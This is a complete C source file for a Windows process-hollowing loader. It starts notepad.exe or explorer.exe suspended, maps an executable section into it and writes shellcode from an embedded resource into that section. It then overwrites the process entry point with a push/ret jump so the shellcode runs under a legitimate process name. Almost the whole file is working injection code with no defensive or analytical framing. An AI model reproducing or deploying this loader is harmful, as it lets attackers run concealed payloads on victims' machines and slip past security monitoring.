#include <stdio.h>
#include <windows.h>
#include "resource.h"

/*
 * Process Hollowing Technique 3: Section Mapping + OEP Patching
 * 
 * This variant uses:
 * - ZwCreateSection / ZwMapViewOfSection with PAGE_EXECUTE_WRITECOPY
 * - Patches the original process entry point with "push <addr>; ret" to redirect to shellcode
 * - Works with raw shellcode (.bin) - no PE parsing required
 */

// Correct PROCESS_BASIC_INFORMATION for 32-bit
typedef struct _MY_PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} MY_PROCESS_BASIC_INFORMATION;

typedef enum _MY_PROCESSINFOCLASS {
    MyProcessBasicInformation = 0
} MY_PROCESSINFOCLASS;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

// Function typedefs
typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    MY_PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pfnZwCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* pfnZwMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	MY_PROCESS_BASIC_INFORMATION pbi;
	DWORD oldProtection = 0;
	BYTE headerBuffer[4096];

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&pbi, sizeof(pbi));

	printf("=== Process Hollowing - Section Mapping + OEP Patch ===\n\n");

	HINSTANCE handleNtDll = LoadLibraryA("ntdll.dll");
	if (!handleNtDll)
	{
		printf("[-] Failed to load ntdll\n");
		return -1;
	}

	pfnNtQueryInformationProcess NtQueryInformationProcess = 
		(pfnNtQueryInformationProcess)GetProcAddress(handleNtDll, "NtQueryInformationProcess");
	pfnZwCreateSection ZwCreateSection = 
		(pfnZwCreateSection)GetProcAddress(handleNtDll, "ZwCreateSection");
	pfnZwMapViewOfSection ZwMapViewOfSection = 
		(pfnZwMapViewOfSection)GetProcAddress(handleNtDll, "ZwMapViewOfSection");

	if (!NtQueryInformationProcess || !ZwCreateSection || !ZwMapViewOfSection)
	{
		printf("[-] Failed to get NT function addresses\n");
		return -1;
	}

	// Use 32-bit target process on 64-bit Windows
	const char* targetProcess = "C:\\Windows\\SysWOW64\\notepad.exe";
	
	if (!CreateProcess(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		// Fallback to explorer.exe if SysWOW64 doesn't exist (32-bit Windows)
		targetProcess = "C:\\Windows\\explorer.exe";
		if (!CreateProcess(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		{
			printf("[-] CreateProcess Failed: %i\n", GetLastError());
			return -1;
		}
	}

	printf("[+] Target process created: %s (PID: %i)\n", targetProcess, pi.dwProcessId);

	/* Get PEB address */
	ULONG returnLength = 0;
	NTSTATUS queryStatus = NtQueryInformationProcess(pi.hProcess, MyProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
	if (queryStatus != 0)
	{
		printf("[-] NtQueryInformationProcess failed: 0x%x\n", queryStatus);
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	printf("[+] PEB address: 0x%p\n", pbi.PebBaseAddress);

	/* 
	 * Read ImageBaseAddress from PEB
	 * On 32-bit process: offset 0x08
	 * We read a small chunk of PEB to get ImageBaseAddress
	 */
	BYTE pebData[16] = {0};
	SIZE_T bytesRead = 0;
	
	if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebData, sizeof(pebData), &bytesRead))
	{
		printf("[-] Failed to read PEB: %i (read %zu bytes)\n", GetLastError(), bytesRead);
		
		// Try alternative: use module info
		printf("[*] Trying alternative method...\n");
	}

	// ImageBaseAddress is at offset 0x08 in PEB32
	LPVOID imageBaseAddress = *(LPVOID*)(pebData + 0x08);
	
	if (imageBaseAddress == NULL)
	{
		// Fallback: assume standard ImageBase for notepad
		// Or try to get it another way
		printf("[!] ImageBaseAddress is NULL, trying fallback...\n");
		
		// Read directly from the expected location
		DWORD imgBase = 0;
		if (ReadProcessMemory(pi.hProcess, (LPVOID)((ULONG_PTR)pbi.PebBaseAddress + 8), &imgBase, 4, &bytesRead))
		{
			imageBaseAddress = (LPVOID)imgBase;
			printf("[+] Fallback successful: ImageBase = 0x%p\n", imageBaseAddress);
		}
		else
		{
			printf("[-] Fallback also failed: %i\n", GetLastError());
			TerminateProcess(pi.hProcess, 1);
			return -1;
		}
	}

	printf("[+] Target ImageBase: 0x%p\n", imageBaseAddress);

	/* Load shellcode from resource */
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	if (!hResource)
	{
		printf("[-] FindResource failed: %i\n", GetLastError());
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	DWORD shellcodeSize = SizeofResource(NULL, hResource);
	HGLOBAL hResourceData = LoadResource(NULL, hResource);
	if (!hResourceData)
	{
		printf("[-] LoadResource failed: %i\n", GetLastError());
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	LPVOID shellcode = LockResource(hResourceData);
	printf("[+] Shellcode loaded from resource (%d bytes)\n", shellcodeSize);

	/* Read target process PE headers to get entry point */
	if (!ReadProcessMemory(pi.hProcess, imageBaseAddress, headerBuffer, sizeof(headerBuffer), NULL))
	{
		printf("[-] Failed to read target headers: %i\n", GetLastError());
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)headerBuffer;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("[-] Invalid DOS signature in target\n");
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)(headerBuffer + pDosHeader->e_lfanew);
	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("[-] Invalid NT signature in target\n");
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	DWORD entryPointRVA = pNTHeader->OptionalHeader.AddressOfEntryPoint;
	LPVOID entryPointAddr = (LPVOID)((DWORD)imageBaseAddress + entryPointRVA);
	printf("[+] Target entry point: 0x%p\n", entryPointAddr);

	/* Create section for shellcode */
	HANDLE hSection = NULL;
	LARGE_INTEGER sectionSize;
	sectionSize.QuadPart = shellcodeSize;

	NTSTATUS status = ZwCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		&sectionSize,
		PAGE_EXECUTE_WRITECOPY,
		SEC_COMMIT,
		NULL
	);

	if (status != 0)
	{
		printf("[-] ZwCreateSection failed: 0x%x\n", status);
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	printf("[+] Section created\n");

	/* Map section into target process */
	PVOID sectionBaseAddress = NULL;
	SIZE_T viewSize = 0;

	status = ZwMapViewOfSection(
		hSection,
		pi.hProcess,
		&sectionBaseAddress,
		0,
		0,
		NULL,
		&viewSize,
		ViewShare,
		0,
		PAGE_EXECUTE_WRITECOPY
	);

	if (status != 0)
	{
		printf("[-] ZwMapViewOfSection failed: 0x%x\n", status);
		CloseHandle(hSection);
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	printf("[+] Section mapped at: 0x%p (size: %zu)\n", sectionBaseAddress, viewSize);

	/* Write shellcode to mapped section */
	if (!WriteProcessMemory(pi.hProcess, sectionBaseAddress, shellcode, shellcodeSize, NULL))
	{
		printf("[-] Failed to write shellcode: %i\n", GetLastError());
		CloseHandle(hSection);
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	printf("[+] Shellcode written to section\n");

	/*
	 * Patch entry point with:
	 *   0x68 XX XX XX XX   PUSH <shellcode_address>
	 *   0xC3               RET
	 * 
	 * This redirects execution to our shellcode when the process starts
	 */
	BYTE patchCode[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xC3 };
	*(DWORD*)(patchCode + 1) = (DWORD)sectionBaseAddress;

	/* Change entry point protection to writable */
	if (!VirtualProtectEx(pi.hProcess, entryPointAddr, sizeof(patchCode), PAGE_EXECUTE_READWRITE, &oldProtection))
	{
		printf("[-] VirtualProtectEx failed: %i\n", GetLastError());
		CloseHandle(hSection);
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	/* Write patch */
	if (!WriteProcessMemory(pi.hProcess, entryPointAddr, patchCode, sizeof(patchCode), NULL))
	{
		printf("[-] Failed to patch entry point: %i\n", GetLastError());
		CloseHandle(hSection);
		TerminateProcess(pi.hProcess, 1);
		return -1;
	}

	/* Restore original protection */
	VirtualProtectEx(pi.hProcess, entryPointAddr, sizeof(patchCode), oldProtection, &oldProtection);

	printf("[+] Entry point patched: push 0x%p; ret\n", sectionBaseAddress);

	/* Resume thread - shellcode will execute */
	ResumeThread(pi.hThread);

	printf("[+] Thread resumed - shellcode executing\n");
	printf("\n=== Process Hollowing Complete ===\n");
	printf("Target PID: %i\n", pi.dwProcessId);
	printf("Shellcode at: 0x%p\n", sectionBaseAddress);

	CloseHandle(hSection);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return 0;
}
